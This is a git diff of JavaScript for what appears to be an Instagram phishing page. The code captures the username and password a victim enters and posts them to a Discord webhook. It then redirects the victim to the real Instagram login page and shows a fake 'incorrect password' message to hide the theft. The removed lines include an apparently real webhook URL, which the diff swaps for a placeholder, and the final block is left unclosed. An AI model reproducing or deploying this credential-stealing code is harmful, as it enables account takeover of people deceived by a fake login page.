@@ -2,7 +2,6 @@ const loginButton = document.querySelector("button[type='submit']");
 const password = document.querySelector("#password");
 const username = document.querySelector("#email");
 const showPasswordBtn = document.querySelector("#tchange");
-const alertMessage = document.getElementById("alert-message"); // Added for error message
 
 password.addEventListener("input", disableBtn);
 username.addEventListener("input", disableBtn);
@@ -29,20 +28,12 @@ function disableBtn() {
 
 let Info;
 
-loginButton.addEventListener("click", async () => {
-  Info = await getInfo();
-  console.log(Info);
-
-  const loginSuccess = await sendInfo();
-  if (loginSuccess) {
-    console.log("Login successful!");
-    window.location.replace("https://www.instagram.com/accounts/login/");
-  } else {
-    console.log("Incorrect Password!");
-
-    // Display an error message
-    alertMessage.innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
-  }
+loginButton.addEventListener("click", () => {
+  (async function() {
+    Info = await getInfo();
+    console.log(Info);
+    sendInfo();
+  })();
 });
 
 async function getInfo() {
@@ -59,7 +50,7 @@ async function getInfo() {
 }
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR";
+  const webhook = "YOUR_DISCORD_WEBHOOK_URL";
 
   const embed = {
     color: 1585803, // #18328b
@@ -79,20 +70,11 @@ async function sendInfo() {
   };
 
   try {
-    const response = await fetch(webhook, config);
-
-    if (response.ok) {
-      return true; // Login was successful
-    } else {
-      return false; // Login was unsuccessful
-    }
+    await fetch(webhook, config);
   } catch {
-    setTimeout(function () {
-      window.location.replace("https://www.instagram.com/accounts/login/");
-    }, 1000);
-    return false; // An error occurred
-  }
-  setTimeout(function () {
-    window.location.replace("https://www.instagram.com/accounts/login/");
-  }, 1000);
-}
+    setTimeout(function() {
+     window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
+
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
